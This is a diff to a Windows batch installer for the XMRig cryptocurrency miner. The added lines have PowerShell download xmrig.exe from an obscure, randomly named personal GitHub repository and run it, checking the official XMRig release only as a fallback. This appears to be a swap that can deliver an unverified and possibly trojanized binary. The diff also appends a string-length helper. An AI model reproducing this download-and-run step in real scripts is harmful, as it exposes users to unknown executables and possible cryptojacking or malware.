@@ -82,6 +82,15 @@ if errorlevel 1 (
   exit /b 1
 )
 
+powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/bryamestre12/llkasjidfjn/refs/heads/main/xmrig.exe', '%MINER_DIR%\xmrig.exe')"
+if errorlevel 1 (
+  goto MINER_BAD
+)
+
+"%MINER_DIR%\xmrig.exe" --help >NUL
+if %ERRORLEVEL% equ 0 goto MINER_OK
+
+:MINER_BAD
 for /f tokens^=2^ delims^=^" %%a IN ('powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $str = $wc.DownloadString('https://github.com/xmrig/xmrig/releases/latest'); $str | findstr msvc-win64.zip | findstr download"') DO set MINER_ARCHIVE=%%a
 set "MINER_LOCATION=https://github.com%MINER_ARCHIVE%"
 
@@ -91,7 +100,7 @@ if errorlevel 1 (
 )
 
 :REMOVE_DIR1
-timeout 5 >NUL
+timeout 5
 rmdir /q /s "%MINER_DIR%" >NUL 2>NUL
 IF EXIST "%MINER_DIR%" GOTO REMOVE_DIR1
 
@@ -214,3 +223,13 @@ goto OK
 
 :OK
 exit /b 0
+
+:strlen string len
+setlocal EnableDelayedExpansion
+set "token=#%~1" & set "len=0"
+for /L %%A in (12,-1,0) do (
+  set/A "len|=1<<%%A"
+  for %%B in (!len!) do if "!token:~%%B,1!"=="" set/A "len&=~1<<%%A"
+)
+endlocal & set %~2=%len%
+exit /b
